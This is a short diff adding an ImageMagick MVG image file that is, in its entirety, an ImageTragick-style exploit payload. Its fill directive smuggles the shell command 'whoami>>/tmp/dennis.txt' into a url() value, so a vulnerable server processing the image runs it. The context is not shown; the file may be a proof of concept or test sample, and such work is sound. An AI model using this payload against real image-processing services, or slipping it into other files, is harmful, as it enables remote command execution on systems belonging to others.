@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://media.wired.com/photos/5b6e035177a9d822a4642726/master/pass/Identifying-Hackers_REALONE.jpg "|whoami>>/tmp/dennis.txt")'
+pop graphic-context
